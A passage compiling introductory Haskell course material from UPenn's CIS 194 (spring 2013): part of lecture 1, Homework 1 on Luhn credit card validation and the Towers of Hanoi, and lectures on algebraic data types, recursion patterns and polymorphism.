   > c2 = 'Ã˜'
   > c3 = 'ãƒ€'
   > 
   > -- Strings are lists of characters with special syntax
   > s :: String
   > s = "Hello, Haskell!"

GHCi
----

GHCi is an interactive Haskell REPL (Read-Eval-Print-Loop) that comes
with GHC. At the GHCi prompt, you can evaluate expressions, load
Haskell files with `:load` (`:l`) (and reload them with `:reload`
(`:r`)), ask for the type of an expression with `:type` (`:t`), and
many other things (try `:?` for a list of commands).

Arithmetic
----------

Try evaluating each of the following expressions in GHCi::

   > ex01 = 3 + 2
   > ex02 = 19 - 27
   > ex03 = 2.35 * 8.6
   > ex04 = 8.7 / 3.1
   > ex05 = mod 19 3
   > ex06 = 19 `mod` 3
   > ex07 = 7 ^ 222
   > exNN = (-3) * (-7)

Note how \`backticks\` make a function name into an infix
operator. Note also that negative numbers must often be surrounded by
parentheses, to avoid having the negation sign parsed as
subtraction. (Yes, this is ugly. I'm sorry.)

This, however, gives an error::

   > -- badArith1 = i + n

Addition is only between values of the same numeric type, and
Haskell does not do implicit conversion. You must explicitly
convert with:

-   `fromIntegral`: converts from any integral type (`Int` or
    `Integer`) to any other numeric type.

-   `round`, `floor`, `ceiling`: convert floating-point numbers to
    `Int` or `Integer`.


Now try this::

   > -- badArith2 = i / i

This is an error since `/` performs floating-point division only.
For integer division we can use `div`.::

   > ex08 = i `div` i
   > ex09 = 12 `div` 5

If you are used to other languages which do implicit conversion of
numeric types, this can all seem rather prudish and annoying at first.
However, I promise you'll get used to it---and in time you may even
come to appreciate it.  Implicit numeric conversion encourages sloppy
thinking about numeric code.

Boolean logic
-------------

As you would expect, Boolean values can be combined with `(&&)`
(logical and), `(||)` (logical or), and `not`. For example,
::

   > ex10 = True && False
   > ex11 = not (False || True)

Things can be compared for equality with `(==)` and `(/=)`, or
compared for order using `(<)`, `(>)`, `(<=)`, and `(>=)`.
::

   > ex12 = ('a' == 'a')
   > ex13 = (16 /= 3)
   > ex14 = (5 > 3) && ('p' <= 'q')
   > ex15 = "Haskell" > "C++"

Haskell also has `if`-expressions: `if b then t else f` is an
expression which evaluates to `t` if the Boolean expression `b`
evaluates to `True`, and `f` if `b` evaluates to `False`.  Notice that
`if`-*expressions* are very different than `if`-*statements*.  For
example, with an if-statement, the `else` part can be optional; an
omitted `else` clause means "if the test evaluates to `False` then do
nothing".  With an `if`-expression, on the other hand, the `else` part
is required, since the `if`-expression must result in some value.

Idiomatic Haskell does not use `if` expressions very much, often using
pattern-matching or *guards* instead (see the next section).

Defining basic functions
------------------------

We can write functions on integers by cases.

> -- Compute the sum of the integers from 1 to n.
> sumtorial :: Integer -> Integer
> sumtorial 0 = 0
> sumtorial n = n + sumtorial (n-1)

Note the syntax for the type of a function: `sumtorial :: Integer ->
Integer` says that `sumtorial` is a function which takes an `Integer`
as input and yields another `Integer` as output.

Each clause is checked in order from top to bottom, and the first
matching clause is chosen.  For example, `sumtorial 0` evaluates to
`0`, since the first clause is matched.  `sumtorial 3` does not match
the first clause (`3` is not `0`), so the second clause is tried.  A
variable like `n` matches anything, so the second clause matches and
`sumtorial 3` evaluates to `3 + sumtorial (3-1)` (which can then be
evaluated further).

Choices can also be made based on arbitrary Boolean expressions using
*guards*.  For example::

   > hailstone :: Integer -> Integer
   > hailstone n
   >   | n `mod` 2 == 0 = n `div` 2
   >   | otherwise      = 3*n + 1

Any number of guards can be associated with each clause of a function
definition, each of which is a Boolean expression.  If the clause's
patterns match, the guards are evaluated in order from top to bottom,
and the first one which evaluates to `True` is chosen.  If none of the
guards evaluate to `True`, matching continues with the next clause.

For example, suppose we evaluate `hailstone 3`.  First, `3` is matched
against `n`, which succeeds (since a variable matches anything).
Next, ``n `mod` 2 == 0`` is evaluated; it is `False` since `n = 3`
does not result in a remainder of `0` when divided by `2`.
`otherwise` is just an convenient synonym for `True`, so the second
guard is chosen, and the result of `hailstone 3` is thus `3*3 + 1 =
10`.

As a more complex (but more contrived) example::

   > foo :: Integer -> Integer
   > foo 0 = 16
   > foo 1 
   >   | "Haskell" > "C++" = 3
   >   | otherwise         = 4
   > foo n
   >   | n < 0            = 0
   >   | n `mod` 17 == 2  = -43
   >   | otherwise        = n + 3

What is `foo (-3)`? `foo 0`? `foo 1`? `foo 36`? `foo 38`?

As a final note about Boolean expressions and guards, suppose we
wanted to abstract out the test of evenness used in defining
`hailstone`.  A first attempt is shown below::

   > isEven :: Integer -> Bool
   > isEven n 
   >   | n `mod` 2 == 0 = True
   >   | otherwise      = False

This *works*, but it is much too complicated.  Can you see why?

Pairs
-----

We can pair things together like so::

   > p :: (Int, Char)
   > p = (3, 'x')

Notice that the `(x,y)` notation is used both for the *type* of a pair
and a pair *value*.

The elements of a pair can be extracted again with 
*pattern matching*:

> sumPair :: (Int,Int) -> Int
> sumPair (x,y) = x + y

Haskell also has triples, quadruples, ... but you should never use
them. As we'll see next week, there are much better ways to package
three or more pieces of information together.

Using functions, and multiple arguments
---------------------------------------

To apply a function to some arguments, just list the arguments after
the function, separated by spaces, like this:

> f :: Int -> Int -> Int -> Int
> f x y z = x + y + z
> exFF = f 3 17 8

The above example applies the function `f` to the three arguments `3`,
`17`, and `8`.  Note also the syntax for the type of a function with
multiple arguments, like `Arg1Type -> Arg2Type -> ... -> ResultType`.
This might seem strange to you (and it should!).  Why all the arrows?
Wouldn't it make more sense for the type of `f` to be something like
`Int Int Int -> Int`?  Actually, the syntax is no accident: it is the
way it is for a very deep and beautiful reason, which we'll learn
about in a few weeks; for now you just have to take my word for it!

Note that **function application has higher precedence than any infix
operators**.  So it would be incorrect to write::

   `f 3 n+1 7`

if you intend to pass `n+1` as the second argument to `f`, because
this parses as::

   `(f 3 n) + (1 7)`.

Instead, one must write::

   `f 3 (n+1) 7`.

Lists
-----

*Lists* are one of the most basic data types in Haskell.
::

> nums, range, range2 :: [Integer]
> nums   = [1,2,3,19]
> range  = [1..100]
> range2 = [2,4..100]

Haskell (like Python) also has *list comprehensions*; you can read
about them in [LYAH](http://learnyouahaskell.com/starting-out).

Strings are just lists of characters. That is, `String` is just an
abbreviation for `[Char]`, and string literal syntax (text surrounded
by double quotes) is just an abbreviation for a list of `Char` literals.
::

> -- hello1 and hello2 are exactly the same.
>
> hello1 :: [Char]
> hello1 = ['h', 'e', 'l', 'l', 'o']
>
> hello2 :: String
> hello2 = "hello"
>
> helloSame = hello1 == hello2

This means that all the standard library functions for processing
lists can also be used to process `String`s.

Constructing lists
------------------

The simplest possible list is the empty list: 
::

> emptyList = []

Other lists are built up from the empty list using the *cons*
operator, `(:)`. Cons takes an element and a list, and produces a
new list with the element prepended to the front.
::

> ex17 = 1 : []
> ex18 = 3 : (1 : [])
> ex19 = 2 : 3 : 4 : []

> ex20 = [2,3,4] == 2 : 3 : 4 : []

We can see that `[2,3,4]` notation is just convenient shorthand for
`2 : 3 : 4 : []`. Note also that these are really
*singly linked lists*, NOT arrays.
::

> -- Generate the sequence of hailstone iterations from a starting number.
> hailstoneSeq :: Integer -> [Integer]
> hailstoneSeq 1 = [1]
> hailstoneSeq n = n : hailstoneSeq (hailstone n)

We stop the hailstone sequence when we reach 1.  The hailstone
sequence for a general `n` consists of `n` itself, followed by the
hailstone sequence for `hailstone n`, that is, the number obtained by
applying the hailstone transformation once to `n`.


Functions on lists
------------------

We can write functions on lists using *pattern matching*. 
::

> -- Compute the length of a list of Integers.
> intListLength :: [Integer] -> Integer
> intListLength []     = 0
> intListLength (x:xs) = 1 + intListLength xs

The first clause says that the length of an empty list is 0.  The
second clause says that if the input list looks like `(x:xs)`, that
is, a first element `x` consed onto a remaining list `xs`, then the
length is one more than the length of `xs`.

Since we don't use `x` at all we could also replace it by an
underscore: `intListLength (_:xs) = 1 + intListLength xs`.

We can also use nested patterns::

> sumEveryTwo :: [Integer] -> [Integer]
> sumEveryTwo []         = []     -- Do nothing to the empty list
> sumEveryTwo (x:[])     = [x]    -- Do nothing to lists with a single element
> sumEveryTwo (x:(y:zs)) = (x + y) : sumEveryTwo zs

Note how the last clause matches a list starting with `x` and followed
by... a list starting with `y` and followed by the list `zs`.  We
don't actually need the extra parentheses, so `sumEveryTwo (x:y:zs) =
...` would be equivalent.


Combining functions
-------------------

It's good Haskell style to build up more complex functions by
combining many simple ones.
::

> -- The number of hailstone steps needed to reach 1 from a starting
> -- number.
> hailstoneLen :: Integer -> Integer
> hailstoneLen n = intListLength (hailstoneSeq n) - 1

This may seem inefficient to you: it generates the entire hailstone
sequence first and then finds its length, which wastes lots of
memory... doesn't it? Actually, it doesn't! Because of Haskell's
lazy evaluation, each element of the sequence is only generated as
needed, so the sequence generation and list length calculation are
interleaved. The whole computation uses only O(1) memory, no matter
how long the sequence. (Actually, this is a tiny white lie, but
explaining why (and how to fix it) will have to wait a few weeks.)

We'll learn more about Haskell's lazy evaluation strategy in a few
weeks. For now, the take-home message is: don't be afraid to write
small functions that transform whole data structures, and combine
them to produce more complex functions. It may feel unnatural at
first, but it's the way to write idiomatic (and efficient) Haskell,
and is actually a rather pleasant way to write programs once you
get used to it.


A word about error messages
---------------------------

Actually, six: 

**Don't be scared of error messages!**

GHC's error messages can be rather long and (seemingly) scary.
However, usually they're long not because they are obscure, but
because they contain a lot of useful information!  Here's an example:
::

    Prelude> 'x' ++ "foo"

    <interactive>:1:1:
        Couldn't match expected type `[a0]' with actual type `Char'
        In the first argument of `(++)', namely 'x'
        In the expression: 'x' ++ "foo"
        In an equation for `it': it = 'x' ++ "foo"

First we are told "Couldn't match expected type `[a0]` with actual
type `Char`".  This means that *something* was expected to have a list
type, but actually had type `Char`.  What something?  The next line
tells us: it's the first argument of `(++)` which is at fault, namely,
`'x'`.  The next lines go on to give us a bit more context.  Now we
can see what the problem is: clearly `'x'` has type `Char`, as the
first line said.  Why would it be expected to have a list type?  Well,
because it is used as an argument to `(++)`, which takes a list as its
first argument.

When you get a huge error message, resist your initial impulse to run
away; take a deep breath; and read it carefully.  You won't
necessarily understand the entire thing, but you will probably learn a
lot, and you may just get enough information to figure out what the
problem is.


/CS194 Homework 01
========================================

https://www.seas.upenn.edu/~cis1940/spring13/hw/01-intro.pdf

CIS 194: Homework 1 
Due Monday, January 14

When solving the homework, strive to create not just code that
works, but code that is stylish and concise. See the style guide on
the website for some general guidelines. Try to write small functions
which perform just a single task, and then combine those smaller
pieces to create more complex functions. Don’t repeat yourself: write
one function for each logical task, and reuse functions as necessary.

Be sure to write functions with exactly the specified name and
type signature for each exercise (to help us test your code). You may
create additional helper functions with whatever names and type
signatures you wish.

Validating Credit Card Numbers1

Adapted from the first practicum assigned in the University of Utrecht functional
programming course taught by Doaitse Swierstra, 2008-2009.

Have you ever wondered how websites validate your credit card
number when you shop online? They don’t check a massive database
of numbers, and they don’t use magic. In fact, most credit providers
rely on a checksum formula for distinguishing valid numbers from
random collections of digits (or typing mistakes).

In this section, you will implement the validation algorithm for
credit cards. It follows these steps:

*  Double the value of every second digit beginning from the right.
   That is, the last digit is unchanged; the second-to-last digit is doubled; 
   the third-to-last digit is unchanged; and so on. For example,
   [1,3,8,6] becomes [2,3,16,6].

*  Add the digits of the doubled values and the undoubled digits from the original number. 
   For example, [2,3,16,6] becomes 2+3+1+6+6 = 18.
   
*  Calculate the remainder when the sum is divided by 10. For the
   above example, the remainder would be 8.

If the result equals 0, then the number is valid.

Exercise 1 We need to first find the digits of a number. Define the functions::

   toDigits :: Integer -> [Integer]
   toDigitsRev :: Integer -> [Integer]

toDigits should convert positive Integers to a list of digits. 
(For 0 or negative inputs, toDigits should return the empty list.) 
toDigitsRev should do the same, but with the digits reversed.::

   Example: toDigits 1234 == [1,2,3,4]
   Example: toDigitsRev 1234 == [4,3,2,1]
   Example: toDigits 0 == []
   Example: toDigits (-17) == []

Exercise 2 Once we have the digits in the proper order, we need to
double every other one. Define a function::

   doubleEveryOther :: [Integer] -> [Integer]

Remember that doubleEveryOther should double every other number beginning from 
the right, that is, the second-to-last, fourth-to-last,
. . . numbers are doubled.

   Example: doubleEveryOther [8,7,6,5] == [16,7,12,5]
   Example: doubleEveryOther [1,2,3] == [1,4,3]

Exercise 3 The output of doubleEveryOther has a mix of one-digit
and two-digit numbers. Define the function::

   sumDigits :: [Integer] -> Integer

to calculate the sum of all digits.
Example: sumDigits [16,7,12,5] = 1 + 6 + 7 + 1 + 2 + 5 = 22

Exercise 4 Define the function ::

   validate :: Integer -> Bool

that indicates whether an Integer could be a valid credit card number. 
This will use all functions defined in the previous exercises.::

   Example: validate 4012888888881881 = True
   Example: validate 4012888888881882 = False

The Towers of Hanoi2

Adapted from an assignment given in UPenn CIS 552, taught by Benjamin Pierce

Exercise 5 The Towers of Hanoi is a classic puzzle with a solution
that can be described recursively. Disks of different sizes are stacked
on three pegs; the goal is to get from a starting configuration with
all disks stacked on the first peg to an ending configuration with all
disks stacked on the last peg, as shown in Figure 1.::

      =           |            |
     ===          |            |
    =====         |            |
   =======        |            |
   ---+-----------+------------+-------
   
                  ⇓

      |           |            =       
      |           |           ===      
      |           |          =====     
      |           |         =======    
   ---+-----------+------------+-------

   Figure 1: The Towers of Hanoi

The only rules are 

*  you may only move one disk at a time, and
*  a larger disk may never be stacked on top of a smaller one.

For example, as the first move all you can do is move the topmost,
smallest disk onto a different peg, since only one disk may be moved
at a time.

Figure 2: A valid first move. From this point, it is illegal to move to 
the configuration shown in
Figure 3, because you are not allowed to put the green disk on top of
the smaller blue one.

Figure 3: An illegal configuration.
To move n discs (stacked in increasing size) from peg a to peg b
using peg c as temporary storage,

1. move n − 1 discs from a to c using b as temporary storage
2. move the top disc from a to b
3. move n − 1 discs from c to b using a as temporary storage.

For this exercise, define a function hanoi with the following type:

   type Peg = String
   type Move = (Peg, Peg)
   hanoi :: Integer -> Peg -> Peg -> Peg -> [Move]

Given the number of discs and names for the three pegs, hanoi
should return a list of moves to be performed to move the stack of
discs from the first peg to the second.

Note that a type declaration, like type Peg = String above, makes
a type synonym. In this case Peg is declared as a synonym for String,
and the two names Peg and String can now be used interchangeably.
Giving more descriptive names to types in this way can be used to
give shorter names to complicated types, or (as here) simply to help
with documentation.

Example: hanoi 2 "a" "b" "c" == [("a","c"), ("a","b"), ("c","b")]

Exercise 6 (Optional) What if there are four pegs instead of three?
That is, the goal is still to move a stack of discs from the first peg to
the last peg, without ever placing a larger disc on top of a smaller
one, but now there are two extra pegs that can be used as “temporary” storage 
instead of only one. Write a function similar to hanoi
which solves this problem in as few moves as possible.

It should be possible to do it in far fewer moves than with three
pegs. For example, with three pegs it takes 215 − 1 = 32767 moves
to transfer 15 discs. With four pegs it can be done in 129 moves. (See
Exercise 1.17 in Graham, Knuth, and Patashnik, Concrete Mathematics,
second ed., Addison-Wesley, 1994.)


/CS194 Lectures 02 Algebraic data types
========================================

- https://www.seas.upenn.edu/~cis1940/spring13/lectures/02-ADTs.lhs
- https://www.seas.upenn.edu/~cis1940/spring13/lectures/02-ADTs.html


CIS 194 Week 2  
21 January 2013

Suggested reading: 

  * [Real World Haskell](http://book.realworldhaskell.org/),
    chapters 2 and 3

Enumeration types
-----------------

Like many programming languages, Haskell allows programmers to create
their own *enumeration* types.  Here's a simple example:

> data Thing = Shoe 
>            | Ship 
>            | SealingWax 
>            | Cabbage 
>            | King
>   deriving Show

This declares a new type called `Thing` with five *data constructors*
`Shoe`, `Ship`, etc. which are the (only) values of type `Thing`.
(The `deriving Show` is a magical incantation which tells GHC to
automatically generate default code for converting `Thing`s to
`String`s. This is what `ghci` uses when printing the value of
an expression of type `Thing`.)

> shoe :: Thing
> shoe = Shoe
>
> listO'Things :: [Thing]
> listO'Things = [Shoe, SealingWax, King, Cabbage, King]

We can write functions on `Thing`s by *pattern-matching*.

> isSmall :: Thing -> Bool
> isSmall Shoe       = True
> isSmall Ship       = False
> isSmall SealingWax = True
> isSmall Cabbage    = True
> isSmall King       = False

Recalling how function clauses are tried in order from top to bottom,
we could also make the definition of `isSmall` a bit shorter like so:

> isSmall2 :: Thing -> Bool
> isSmall2 Ship = False
> isSmall2 King = False
> isSmall2 _    = True

Beyond enumerations
-------------------

`Thing` is an *enumeration type*, similar to those provided by other
languages such as Java or C++.  However, enumerations are actually
only a special case of Haskell's more general *algebraic data types*.
As a first example of a data type which is not just an enumeration,
consider the definition of `FailableDouble`:

> data FailableDouble = Failure
>                     | OK Double
>   deriving Show

This says that the `FailableDouble` type has two data constructors.
The first one, `Failure`, takes no arguments, so `Failure` by itself
is a value of type `FailableDouble`.  The second one, `OK`, takes an
argument of type `Double`.  So `OK` by itself is not a value of type
`FailableDouble`; we need to give it a `Double`.  For example, `OK
3.4` is a value of type `FailableDouble`.

> exD1 = Failure
> exD2 = OK 3.4

Thought exercise: what is the type of `OK`? 

> safeDiv :: Double -> Double -> FailableDouble
> safeDiv _ 0 = Failure
> safeDiv x y = OK (x / y)

More pattern-matching!  Notice how in the `OK` case we can give a name
to the `Double` that comes along with it.

> failureToZero :: FailableDouble -> Double
> failureToZero Failure = 0
> failureToZero (OK d)  = d

Data constructors can have more than one argument.

> -- Store a person's name, age, and favourite Thing.
> data Person = Person String Int Thing
>   deriving Show
>
> brent :: Person
> brent = Person "Brent" 31 SealingWax
>
> stan :: Person
> stan  = Person "Stan" 94 Cabbage
>
> getAge :: Person -> Int
> getAge (Person _ a _) = a

Notice how the type constructor and data constructor are both named
`Person`, but they inhabit different namespaces and are different
things.  This idiom (giving the type and data constructor of a
one-constructor type the same name) is common, but can be confusing
until you get used to it.

Algebraic data types in general
-------------------------------

In general, an algebraic data type has one or more data constructors,
and each data constructor can have zero or more arguments.

    data AlgDataType = Constr1 Type11 Type12
                     | Constr2 Type21
                     | Constr3 Type31 Type32 Type33
                     | Constr4

This specifies that a value of type `AlgDataType` can be constructed
in one of four ways: using `Constr1`, `Constr2`, `Constr3`, or
`Constr4`.  Depending on the constructor used, an `AlgDataType` value
may contain some other values.  For example, if it was constructed
using `Constr1`, then it comes along with two values, one of type
`Type11` and one of type `Type12`.

One final note: type and data constructor names must always start with
a capital letter; variables (including names of functions) must always
start with a lowercase letter.  (Otherwise, Haskell parsers would have
quite a difficult job figuring out which names represent variables and
which represent constructors).

Pattern-matching
----------------

We've seen pattern-matching in a few specific cases, but let's see how
pattern-matching works in general.  Fundamentally, pattern-matching is
about taking apart a value by *finding out which constructor* it was
built with.  This information can be used as the basis for deciding
what to do---indeed, in Haskell, this is the *only* way to make a
decision.

For example, to decide what to do with a value of type `AlgDataType`
(the made-up type defined in the previous section), we could write
something like

    foo (Constr1 a b)   = ...
    foo (Constr2 a)     = ...
    foo (Constr3 a b c) = ...
    foo Constr4         = ...

Note how we also get to give names to the values that come along with
each constructor.  Note also that parentheses are required around
patterns consisting of more than just a single constructor.

This is the main idea behind patterns, but there are a few more things
to note.  

  1. An underscore `_` can be used as a "wildcard pattern" which
    matches anything.

  1. A pattern of the form `x@pat` can be used to match a value against
    the pattern `pat`, but *also* give the name `x` to the entire value
    being matched.  For example:

    > baz :: Person -> String
    > baz p@(Person n _ _) = "The name field of (" ++ show p ++ ") is " ++ n

        *Main> baz brent
        "The name field of (Person \"Brent\" 31 SealingWax) is Brent"

  1. Patterns can be *nested*. For example:

    > checkFav :: Person -> String
    > checkFav (Person n _ SealingWax) = n ++ ", you're my kind of person!"
    > checkFav (Person n _ _)          = n ++ ", your favorite thing is lame."

        *Main> checkFav brent
        "Brent, you're my kind of person!"
        *Main> checkFav stan
        "Stan, your favorite thing is lame."

    Note how we nest the pattern `SealingWax` inside the pattern for
    `Person`.

In general, the following grammar defines what can be used as a
pattern:

    pat ::= _
         |  var
         |  var @ ( pat )
         |  ( Constructor pat1 pat2 ... patn )

The first line says that an underscore is a pattern.  The second line
says that a variable by itself is a pattern: such a pattern matches
anything, and "binds" the given variable name to the matched value.
The third line specifies `@`-patterns.  The last line says that a
constructor name followed by a sequence of patterns is itself a
pattern: such a pattern matches a value if that value was constructed
using the given constructor, *and* `pat1` through `patn` all match the
values contained by the constructor, recursively.

(In actual fact, the full grammar of patterns includes yet more
features still, but the rest would take us too far afield for now.)

Note that literal values like `2` or `'c'` can be thought of as
constructors with no arguments.  It is as if the types `Int` and
`Char` were defined like

    data Int  = 0 | 1 | -1 | 2 | -2 | ...
    data Char = 'a' | 'b' | 'c' | ...

which means that we can pattern-match against literal values.  (Of
course, `Int` and `Char` are not *actually* defined this way.)

Case expressions
----------------

The fundamental construct for doing pattern-matching in Haskell is the
`case` expression. In general, a `case` expression looks like

    case exp of
      pat1 -> exp1
      pat2 -> exp2
      ...

When evaluated, the expression `exp` is matched against each of the
patterns `pat1`, `pat2`, ... in turn.  The first matching pattern is
chosen, and the entire `case` expression evaluates to the expression
corresponding to the matching pattern.  For example,

> exCase = case "Hello" of
>            []      -> 3
>            ('H':s) -> length s
>            _       -> 7

evaluates to `4` (the second pattern is chosen; the third pattern
matches too, of course, but it is never reached).

In fact, the syntax for defining functions we have seen is really just
convenient syntax sugar for defining a `case` expression.  For
example, the definition of `failureToZero` given previously can
equivalently be written as

> failureToZero' :: FailableDouble -> Double
> failureToZero' x = case x of
>                      Failure -> 0
>                      OK d    -> d

Recursive data types
--------------------

Data types can be *recursive*, that is, defined in terms of
themselves.  In fact, we have already seen a recursive type---the type
of lists.  A list is either empty, or a single element followed by a
remaining list.  We could define our own list type like so:

> data IntList = Empty | Cons Int IntList

Haskell's own built-in lists are quite similar; they just get to use
special built-in syntax (`[]` and `:`).  (Of course, they also work
for any type of elements instead of just `Int`s; more on this next
week.)

We often use recursive functions to process recursive data types:

> intListProd :: IntList -> Int
> intListProd Empty      = 1
> intListProd (Cons x l) = x * intListProd l

As another simple example, we can define a type of binary trees with
an `Int` value stored at each internal node, and a `Char` stored at
each leaf:

> data Tree = Leaf Char
>           | Node Tree Int Tree
>   deriving Show

(Don't ask me what you would use such a tree for; it's an example,
OK?)  For example,

> tree :: Tree
> tree = Node (Leaf 'x') 1 (Node (Leaf 'y') 2 (Leaf 'z'))


/CS194 Lectures 03 Recursion patterns, polymorphism, and the Prelude
====================================================================

<!--
{-# OPTIONS_GHC -Wall #-}
-->

CIS 194 Week 3  
28 January 2013

While completing HW 2, you probably spent a lot of time writing
explicitly recursive functions.  At this point, you might think that's
what Haskell programmers spend most of their time doing.  In fact,
experienced Haskell programmers *hardly ever* write recursive
functions!

How is this possible? The key is to notice that although recursive
functions can theoretically do pretty much anything, in practice there
are certain common patterns that come up over and over again.  By
abstracting out these patterns into library functions, programmers can
leave the low-level details of actually doing recursion to these
functions, and think about problems at a higher level---that's the
goal of *wholemeal programming*.

Recursion patterns
------------------

Recall our simple definition of lists of `Int` values: 

> data IntList = Empty | Cons Int IntList
>   deriving Show

What sorts of things might we want to do with an `IntList`?  Here are
a few common possibilities:

  * Perform some operation on every element of the list

  * Keep only some elements of the list, and throw others away, based
    on a test

  * "Summarize" the elements of the list somehow (find their sum,
    product, maximum...).

  * You can probably think of others!

**Map**

Let's think about the first one ("perform some operation on every
element of the list").  For example, we could add one to every element
in a list:

 <!-- CLASS

**Write `addOneToAll` in class** 

-->

 <!-- HTML

> addOneToAll :: IntList -> IntList
> addOneToAll Empty       = Empty
> addOneToAll (Cons x xs) = Cons (x+1) (addOneToAll xs)

-->

Or we could ensure that every element in a list is nonnegative by
taking the absolute value:

> absAll :: IntList -> IntList
> absAll Empty       = Empty
> absAll (Cons x xs) = Cons (abs x) (absAll xs)

Or we could square every element:

> squareAll :: IntList -> IntList
> squareAll Empty       = Empty
> squareAll (Cons x xs) = Cons (x*x) (squareAll xs)

At this point, big flashing red lights and warning bells should be
going off in your head.  These three functions look way too similar.
There ought to be some way to abstract out the commonality so we don't
have to repeat ourselves!

There is indeed a way---can you figure it out?  Which parts are the
same in all three examples and which parts change?

The thing that changes, of course, is the operation we want to perform
on each element of the list.  We can specify this operation as a
*function* of type `Int -> Int`.  Here is where we begin to see how
incredibly useful it is to be able to pass functions as inputs to
other functions!

 <!-- CLASS

**Write `mapIntList` in class.**

-->

 <!-- HTML

> mapIntList :: (Int -> Int) -> IntList -> IntList
> mapIntList _ Empty       = Empty
> mapIntList f (Cons x xs) = Cons (f x) (mapIntList f xs)

-->

We can now use `mapIntList` to implement `addOneToAll`, `absAll`, and
`squareAll`:

> exampleList = Cons (-1) (Cons 2 (Cons (-6) Empty))
>
> addOne x = x + 1
> square x = x * x

    mapIntList addOne exampleList
    mapIntList abs    exampleList
    mapIntList square exampleList

**Filter**

Another common pattern is when we want to keep only some elements of a
list, and throw others away, based on a test.  For example, we might
want to keep only the positive numbers:

 <!-- CLASS

**Write `keepOnlyPositive` in class**

-->

 <!-- HTML

> keepOnlyPositive :: IntList -> IntList
> keepOnlyPositive Empty = Empty
> keepOnlyPositive (Cons x xs) 
>   | x > 0     = Cons x (keepOnlyPositive xs)
>   | otherwise = keepOnlyPositive xs

-->

Or only the even ones:

> keepOnlyEven :: IntList -> IntList
> keepOnlyEven Empty = Empty
> keepOnlyEven (Cons x xs)
>   | even x    = Cons x (keepOnlyEven xs)
>   | otherwise = keepOnlyEven xs

How can we generalize this pattern?  What stays the same, and what do
we need to abstract out?

 <!-- CLASS

**Write `filterIntList` in class.**

-->

 <!-- HTML

The thing to abstract out is the *test* (or *predicate*) used to
determine which values to keep.  A predicate is a function of type
`Int -> Bool` which returns `True` for those elements which should be
kept, and `False` for those which should be discarded.  So we can
write `filterIntList` as follows:

> filterIntList :: (Int -> Bool) -> IntList -> IntList
> filterIntList _ Empty = Empty
> filterIntList p (Cons x xs)
>   | p x       = Cons x (filterIntList p xs)
>   | otherwise = filterIntList p xs

-->

**Fold**

The final pattern we mentioned was to "summarize" the elements of the
list; this is also variously known as a "fold" or "reduce" operation.
We'll come back to this next week.  In the meantime, you might want to
think about how to abstract out this pattern!

Polymorphism
------------

We've now written some nice, general functions for mapping and
filtering over lists of `Int`s.  But we're not done generalizing!
What if we wanted to filter lists of `Integer`s? or `Bool`s?  Or
lists of lists of trees of stacks of `String`s?  We'd have to make a
new data type and a new function for each of these cases.  Even worse,
the *code would be exactly the same*; the only thing that would be
different is the *type signatures*.  Can't Haskell help us out here?

Of course it can! Haskell supports *polymorphism* for both data types
and functions.  The word "polymorphic" comes from Greek (πολύμορφος)
and means "having many forms": something which is polymorphic works
for multiple types.

**Polymorphic data types**

First, let's see how to declare a polymorphic data type.

> data List t = E | C t (List t)

(We can't reuse `Empty` and `Cons` since we already used those for the
constructors of `IntList`, so we'll use `E` and `C` instead.)  Whereas
before we had `data IntList = ...`, we now have `data List t = ...`
The `t` is a *type variable* which can stand for any type.  (Type
variables must start with a lowercase letter, whereas types must start
with uppercase.)  `data List t = ...` means that the `List` type is
*parameterized* by a type, in much the same way that a function can be
parameterized by some input.

Given a type `t`, a `(List t)` consists of either the constructor `E`,
or the constructor `C` along with a value of type `t` and another
`(List t)`.  Here are some examples:

> lst1 :: List Int
> lst1 = C 3 (C 5 (C 2 E))
>
> lst2 :: List Char
> lst2 = C 'x' (C 'y' (C 'z' E))
>
> lst3 :: List Bool
> lst3 = C True (C False E)

**Polymorphic functions**

Now, let's generalize `filterIntList` to work over our new polymorphic
`List`s.  We can just take code of `filterIntList` and replace `Empty`
by `E` and `Cons` by `C`:

> filterList _ E = E
> filterList p (C x xs)
>   | p x       = C x (filterList p xs)
>   | otherwise = filterList p xs

Now, what is the type of `filterList`?  Let's see what type `ghci`
infers for it:

    *Main> :t filterList
    filterList :: (t -> Bool) -> List t -> List t    

We can read this as: "for any type `t`, 
`filterList` takes a function from `t` to `Bool`, and a list of
`t`'s, and returns a list of `t`'s."

What about generalizing `mapIntList`?  What type should we give to a
function `mapList` that applies a function to every element in a
`List t`?

Our first idea might be to give it the type

~~~~ {.haskell}
mapList :: (t -> t) -> List t -> List t
~~~~

This works, but it means that when applying `mapList`, we always get a
list with the same type of elements as the list we started with.  This
is overly restrictive: we'd like to be able to do things like `mapList
show` in order to convert, say, a list of `Int`s into a list of
`String`s. Here, then, is the most general possible type for
`mapList`, along with an implementation:

> mapList :: (a -> b) -> List a -> List b
> mapList _ E        = E
> mapList f (C x xs) = C (f x) (mapList f xs)

One important thing to remember about polymorphic functions is that
**the caller gets to pick the types**.  When you write a polymorphic
function, it must work for every possible input type.  This---together
with the fact that Haskell has no way to directly make make decisions
based on what type something is---has some interesting implications
which we'll explore later.

The Prelude
-----------

The `Prelude` is a module with a bunch of standard definitions that
gets implicitly imported into every Haskell program.  It's worth
spending some time [skimming through its
documentation](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html)
to familiarize oneself with the tools that are available.

Of course, polymorphic lists are defined in the `Prelude`, along with
[many useful polymorphic functions for working with
them](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#11).
For example, `filter` and `map` are the counterparts to our
`filterList` and `mapList`.  In fact, the [`Data.List` module contains
many more list functions
still](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-List.html).  

Another useful polymorphic type to know is `Maybe`, defined as

~~~~ {.haskell}
data Maybe a = Nothing | Just a
~~~~

A value of type `Maybe a` either contains a value of type `a` (wrapped
in the `Just` constructor), or it is `Nothing` (representing some sort
of failure or error). The [`Data.Maybe` module has functions for
working with `Maybe`
values](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-Maybe.html).

Total and partial functions
---------------------------

Consider this polymorphic type: 

~~~~ {.haskell}
[a] -> a
~~~~

What functions could have such a type?  The type says that given a
list of things of type `a`, the function must produce some value of
type `a`.  For example, the Prelude function `head` has this type.  

...But what happens if `head` is given an empty list as input?  Let's
look at the [source
code](http://www.haskell.org/ghc/docs/latest/html/libraries/base/src/GHC-List.html#head)
for `head`...  

It crashes!  There's nothing else it possibly could do, since it must
work for *all* types.  There's no way to make up an element of an
arbitrary type out of thin air.

`head` is what is known as a *partial function*: there are certain
inputs for which `head` will crash.  Functions which have certain
